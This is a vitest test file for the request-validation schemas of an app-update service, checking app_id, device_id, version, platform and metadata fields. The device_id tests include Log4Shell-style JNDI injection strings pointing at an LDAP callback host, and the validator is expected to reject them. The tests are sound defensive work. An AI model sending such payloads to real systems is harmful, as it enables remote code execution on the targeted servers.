import type { StandardSchema } from '../src/plugin-validation'
import { describe, expect, it } from 'vitest'
import {
  channelSelfRequestSchema,
  INVALID_STRING_APP_ID,
  INVALID_STRING_DEVICE_ID,
  INVALID_STRING_PLATFORM,
  INVALID_STRING_PLUGIN_VERSION,
  MISSING_STRING_APP_ID,
  MISSING_STRING_DEVICE_ID,
  MISSING_STRING_PLATFORM,
  MISSING_STRING_PLUGIN_VERSION,
  MISSING_STRING_VERSION_BUILD,
  MISSING_STRING_VERSION_NAME,
  MISSING_STRING_VERSION_OS,
  NON_STRING_APP_ID,
  NON_STRING_DEVICE_ID,
  NON_STRING_PLATFORM,
  NON_STRING_VERSION_BUILD,
  NON_STRING_VERSION_NAME,
  NON_STRING_VERSION_OS,
  safeParseSchema,
  statsRequestSchema,
  updateRequestSchema,
} from '../src/plugin-validation'

const NO_ERROR = { error: '' }

interface RequestJSON {
  app_id?: string | number
  device_id?: string | number
  version_name?: string | number | boolean
  version_build?: string | number | boolean
  version_code?: string
  version_os?: string | number | boolean
  platform?: string | number | boolean
  plugin_version?: string
  is_prod?: boolean
  is_emulator?: boolean
  custom_id?: string
  key_id?: string
  metadata?: Record<string, unknown>
  action?: string | number
}

const requestJSON: RequestJSON = {
  app_id: 'ee.forgr.demoapp',
  device_id: '9929AFAD-ECF1-4D7F-B0C1-A8CE463C6684',
  version_name: 'builtin',
  version_build: '1.0.1',
  version_code: '1',
  version_os: '16.0',
  platform: 'ios',
  plugin_version: '5.2.18',
  is_prod: false,
  is_emulator: true,
  custom_id: '',
}

const schemas = [updateRequestSchema, statsRequestSchema]

describe('[Capgo parity] plugin validation schemas', () => {
  schemas.forEach((schema, index) => {
    const suffix = index % 2 === 0 ? '- /updates' : '- /stats'

    it(`requires app_id ${suffix}`, () => {
      const body = getJSON()
      delete body.app_id
      expectError(parseJSON(body, schema), MISSING_STRING_APP_ID)
    })

    it(`accepts app_id with underscore and hyphen ${suffix}`, () => {
      expect(parseJSON({ ...getJSON(), app_id: 'ee.forgr.demo_app' }, schema)).toEqual(NO_ERROR)
      expect(parseJSON({ ...getJSON(), app_id: 'ee.forgr.demo-app' }, schema)).toEqual(NO_ERROR)
    })

    it(`rejects non-string and invalid app_id ${suffix}`, () => {
      expectError(parseJSON({ ...getJSON(), app_id: 1000000000000000000000000000 }, schema), NON_STRING_APP_ID)
      expectError(parseJSON({ ...getJSON(), app_id: '' }, schema), INVALID_STRING_APP_ID)
      expectError(parseJSON({ ...getJSON(), app_id: '.ee.forgr.demoapp' }, schema), INVALID_STRING_APP_ID)
      expectError(parseJSON({ ...getJSON(), app_id: 'eeforgrdemoapp' }, schema), INVALID_STRING_APP_ID)
      expectError(parseJSON({ ...getJSON(), app_id: 'ee.forgr.demo+app' }, schema), INVALID_STRING_APP_ID)
    })

    it(`requires valid UUID device_id ${suffix}`, () => {
      const missing = getJSON()
      delete missing.device_id
      expectError(parseJSON(missing, schema), MISSING_STRING_DEVICE_ID)
      expectError(parseJSON({ ...getJSON(), device_id: 2000000000 }, schema), NON_STRING_DEVICE_ID)
      expectError(parseJSON({ ...getJSON(), device_id: 'ECF1-4D7F-B0C1-A8CE463C6684' }, schema), INVALID_STRING_DEVICE_ID)
      expectError(parseJSON({ ...getJSON(), device_id: 'device_${jndi:ldap://1694362129451P}' }, schema), INVALID_STRING_DEVICE_ID)
      expectError(parseJSON({ ...getJSON(), device_id: 'device_${jndi:ldap://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' }, schema), 'String must contain at most 36 character(s)')
    })

    it(`reports both invalid app_id and device_id ${suffix}`, () => {
      const response = parseJSON({ ...getJSON(), app_id: '123456768', device_id: '${jndi:ldap://4q0tv0.dnslog.cn}' }, schema)
      expectError(response, INVALID_STRING_APP_ID)
      expectError(response, INVALID_STRING_DEVICE_ID, 1)
    })

    it(`requires string version_name ${suffix}`, () => {
      const missing = getJSON()
      delete missing.version_name
      expectError(parseJSON(missing, schema), MISSING_STRING_VERSION_NAME)
      expectError(parseJSON({ ...getJSON(), version_name: 300000 }, schema), NON_STRING_VERSION_NAME)
      expectError(parseJSON({ ...getJSON(), version_name: true }, schema), NON_STRING_VERSION_NAME)
    })
  })

  it('rejects empty version_name for /updates but accepts it for /stats and /channel_self', () => {
    expectError(parseJSON({ ...getJSON(), version_name: '' }, updateRequestSchema), MISSING_STRING_VERSION_NAME)
    expect(parseJSON({ ...getJSON(), version_name: '' }, statsRequestSchema)).toEqual(NO_ERROR)
    expect(parseJSON({ ...getJSON(), version_name: '' }, channelSelfRequestSchema)).toEqual(NO_ERROR)
  })

  it('requires non-empty version_build for /updates but accepts empty for /channel_self', () => {
    const missing = getJSON()
    delete missing.version_build
    expectError(parseJSON(missing, updateRequestSchema), MISSING_STRING_VERSION_BUILD)
    expectError(parseJSON({ ...getJSON(), version_build: 4000000 }, updateRequestSchema), NON_STRING_VERSION_BUILD)
    expectError(parseJSON({ ...getJSON(), version_build: true }, updateRequestSchema), NON_STRING_VERSION_BUILD)
    expectError(parseJSON({ ...getJSON(), version_build: '' }, updateRequestSchema), MISSING_STRING_VERSION_BUILD)
    expect(parseJSON({ ...getJSON(), version_build: '' }, channelSelfRequestSchema)).toEqual(NO_ERROR)
  })

  it('requires version_os and platform strings for /stats', () => {
    const missingVersionOs = getJSON()
    delete missingVersionOs.version_os
    expectError(parseJSON(missingVersionOs, statsRequestSchema), MISSING_STRING_VERSION_OS)
    expectError(parseJSON({ ...getJSON(), version_os: -5000000 }, statsRequestSchema), NON_STRING_VERSION_OS)
    expectError(parseJSON({ ...getJSON(), version_os: false }, statsRequestSchema), NON_STRING_VERSION_OS)

    const missingPlatform = getJSON()
    delete missingPlatform.platform
    expectError(parseJSON(missingPlatform, statsRequestSchema), MISSING_STRING_PLATFORM)
    expectError(parseJSON({ ...getJSON(), platform: -6000000 }, statsRequestSchema), NON_STRING_PLATFORM)
    expectError(parseJSON({ ...getJSON(), platform: true }, statsRequestSchema), NON_STRING_PLATFORM)
  })

  it('keeps React Native platform validation to ios and android', () => {
    expect(parseJSON({ ...getJSON(), platform: 'ios' }, updateRequestSchema)).toEqual(NO_ERROR)
    expect(parseJSON({ ...getJSON(), platform: 'android' }, updateRequestSchema)).toEqual(NO_ERROR)
    expectError(parseJSON({ ...getJSON(), platform: 'electron' }, updateRequestSchema), INVALID_STRING_PLATFORM)
  })

  it('requires strict plugin_version for update requests', () => {
    const missing = getJSON()
    delete missing.plugin_version
    expectError(parseJSON(missing, updateRequestSchema), MISSING_STRING_PLUGIN_VERSION)
    expectError(parseJSON({ ...getJSON(), plugin_version: 'v1.2.3' }, updateRequestSchema), INVALID_STRING_PLUGIN_VERSION)
    expect(parseJSON({ ...getJSON(), plugin_version: '1.2.3-beta.1' }, updateRequestSchema)).toEqual(NO_ERROR)
  })

  it('validates key_id and stats metadata limits', () => {
    expectError(parseJSON({ ...getJSON(), key_id: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' }, updateRequestSchema), 'String must contain at most 20 character(s)')
    expectError(parseJSON({ ...getJSON(), custom_id: 'x'.repeat(37) }, statsRequestSchema), 'String must contain at most 36 character(s)')
    expectError(parseJSON({ ...getJSON(), metadata: 'bad' as unknown as Record<string, unknown> }, statsRequestSchema), 'metadata must be an object with string values')
    expectError(parseJSON({ ...getJSON(), metadata: { number: 1 } }, statsRequestSchema), 'metadata values must be strings')
    expectError(parseJSON({ ...getJSON(), metadata: Object.fromEntries(Array.from({ length: 31 }, (_, index) => [`k${index}`, 'v'])) }, statsRequestSchema), 'metadata must contain at most 30 fields')
  })
})

function getJSON(): RequestJSON {
  return { ...requestJSON }
}

function parseJSON(body: RequestJSON, jsonRequestSchema: StandardSchema<unknown>) {
  const parseResult = safeParseSchema(jsonRequestSchema, body)
  if (!parseResult.success)
    return { error: `Cannot parse json: ${parseResult.error.message}`, nestedError: parseResult.error }
  return NO_ERROR
}

function expectError(response: any, expectedErrorMessage: string, errorIndex = 0) {
  expect(response.error).toBeDefined()
  expect(response.error).toContain('Cannot parse json: ')
  expect(response.nestedError).toBeDefined()
  expect(response.nestedError.issues[errorIndex]).toBeDefined()
  expect(response.nestedError.issues[errorIndex].message).toBe(expectedErrorMessage)
}
